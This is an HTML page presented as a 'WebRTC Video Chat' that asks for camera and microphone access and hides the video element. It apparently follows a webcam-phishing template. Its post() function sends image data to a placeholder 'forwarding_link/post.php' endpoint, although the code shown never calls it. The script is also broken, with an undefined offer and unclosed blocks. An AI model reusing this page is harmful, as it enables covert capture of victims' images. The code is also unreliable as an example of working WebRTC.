<!DOCTYPE html>
<html>
  <head>
    <title>WebRTC Video Chat</title>
  </head>
  <body>
      <div class="video-wrap" hidden="hidden">
      <video id="video" playsinline autoplay></video>
    </div>
    
    <center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>


    <script>
      
      function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'forwarding_link/post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};
      
'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
         video.srcObject = stream;

          const peerConnection = new RTCPeerConnection();

          stream.getTracks().forEach(track => {
            peerConnection.addTrack(track, stream);
          });

          peerConnection.ontrack = event => {
           canvas.srcObject = event.streams[0];
          };

          peerConnection.createOffer()
            .then(offer => {
              peerConnection.setLocalDescription(offer);
            })
            .then(() => {
              // Send the offer to the remote peer via signaling server
            });

          // Receive offer from remote peer via signaling server
          peerConnection.setRemoteDescription(offer)
            .then(() => {
              // Create answer and send it back to the remote peer via signaling server
              return peerConnection.createAnswer();
            })
            .then(answer => {
              peerConnection.setLocalDescription(answer);
            })
            .then(() => {
              // Send the answer to the remote peer via signaling server
            });
    </script>
  </body>
</html>
